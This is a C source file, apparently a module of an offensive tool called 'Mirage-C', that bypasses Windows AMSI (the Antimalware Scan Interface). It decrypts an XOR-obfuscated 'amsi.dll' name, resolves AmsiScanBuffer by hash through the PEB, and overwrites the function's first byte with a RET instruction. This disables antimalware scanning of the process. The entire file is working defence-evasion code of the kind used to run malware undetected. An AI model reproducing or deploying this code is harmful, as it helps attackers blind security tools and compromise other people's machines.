/*
 * amsi_bypass.c — AMSI bypass for Mirage-C
 *
 * Direct translation of Zig src/evasion/amsi_bypass.zig.
 * Patches amsi.dll!AmsiScanBuffer with a single RET instruction (0xC3)
 * to prevent AMSI scan buffer calls from reaching the scan engine.
 */

#include "amsi_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_AMSI_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include <string.h>

/* ── XOR-encrypted "amsi.dll" ─────────────────────────────── */
static const uint8_t enc_amsi_dll[] = {
    0x69,0x65,0x2c,0x63,0x6d,0x61,0x2e,0x6c,0x6c,0x64
};
#define AMSI_DLL_LEN sizeof(enc_amsi_dll)

/* ── Helper: load amsi.dll via PEB ────────────────────────── */

static void* load_amsi(void) {
    uint8_t tmp[AMSI_DLL_LEN];
    mirage_xor_decrypt(enc_amsi_dll, tmp, AMSI_DLL_LEN);
    uint32_t h = mirage_encrypted_hash_module((const char*)tmp);
    return mirage_get_module_by_hash(h);
}

/* ── Helper: resolve function from module by hash ─────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Helper: patch first byte of function ─────────────────── */

static int patch_first_byte(void* func_ptr) {
    PVOID base = func_ptr;
    SIZE_T size = 1;
    ULONG old_prot = 0;

    NTSTATUS status = mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(~0ULL),
        &base, &size,
        PAGE_EXECUTE_READWRITE,
        &old_prot
    );
    if (status < 0) return 0;

    /* Write 0xC3 (ret) as first instruction */
    volatile uint8_t* patch = (volatile uint8_t*)func_ptr;
    patch[0] = 0xC3;

    mirage_NtFlushInstructionCache(
        (HANDLE)(intptr_t)(~0ULL),
        func_ptr, 1
    );

    /* Restore original protection */
    PVOID restore_base = func_ptr;
    SIZE_T restore_size = 1;
    mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(~0ULL),
        &restore_base, &restore_size,
        old_prot, &old_prot
    );

    return 1;
}

/* ── mirage_patch_amsi ────────────────────────────────────── */

int mirage_patch_amsi(void) {
    void* amsi = load_amsi();
    if (!amsi) return 0;

    void* scan_buffer = resolve_func(amsi, "AmsiScanBuffer");
    if (!scan_buffer) return 0;

    return patch_first_byte(scan_buffer);
}

#endif /* ENABLE_AMSI_BYPASS */
